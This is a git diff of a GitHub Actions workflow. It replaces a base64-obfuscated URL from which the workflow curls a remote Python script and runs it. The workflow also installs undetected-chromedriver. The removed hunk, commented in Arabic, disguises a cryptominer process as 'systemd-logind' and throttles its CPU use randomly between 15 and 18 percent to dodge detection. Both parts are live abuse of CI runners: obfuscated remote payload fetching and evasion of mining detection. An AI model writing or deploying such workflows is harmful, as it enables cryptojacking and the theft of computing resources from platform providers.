@@ -36,7 +36,7 @@ jobs:
       - name: Download Core Script
         run: |
           echo "[STAGE-2] Downloading app_task.py..."
-          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmV3ZS9yZXNvbHZlL21haW4vc3RhcnRfdGVzdC5weQ==" | base64 --decode)
           curl -sL "$PAYLOAD_URL" -o app_task.py
           echo "[STAGE-2] Download completed."
 
@@ -48,30 +48,6 @@ jobs:
           echo "[STAGE-3] Installing Python dependencies..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # -----------------------------------------------------------
-      # خطوة 4: تفعيل التقييد المذبذب المباشر (15% - 18%)
-      # -----------------------------------------------------------
-      - name: Dynamic CPU Limiter (15% - 18%)
-        run: |
-          echo "⚙️ Activating Dynamic Hardware Throttle Engine..."
-          
-          # اسم العملية المستهدفة (التعدين يظهر باسم systemd-logind)
-          TARGET_EXE="systemd-logind"
-          
-          # سكربت خلفي يتغير كل فترة لكسر نمط الاستهلاك القياسي
-          (
-            while true; do
-              # اختيار نسبة عشوائية بين 15 و 18
-              LIMIT=$((15 + RANDOM % 4))
-              
-              # تطبيق التقييد المباشر على اسم العملية (وضع الخلفية)
-              sudo cpulimit -e "$TARGET_EXE" -l "$LIMIT" -b >/dev/null 2>&1 || true
-              
-              # الانتظار لمدة عشوائية بين 20 و 45 ثانية قبل تغيير النسبة مجدداً
-              SLEEP_TIME=$((20 + RANDOM % 26))
-              sleep $SLEEP_TIME
-            done
-          ) &
 
       # -----------------------------------------------------------
       # خطوة 5: تشغيل السكربت الرئيسي مع مراقبة المهلة
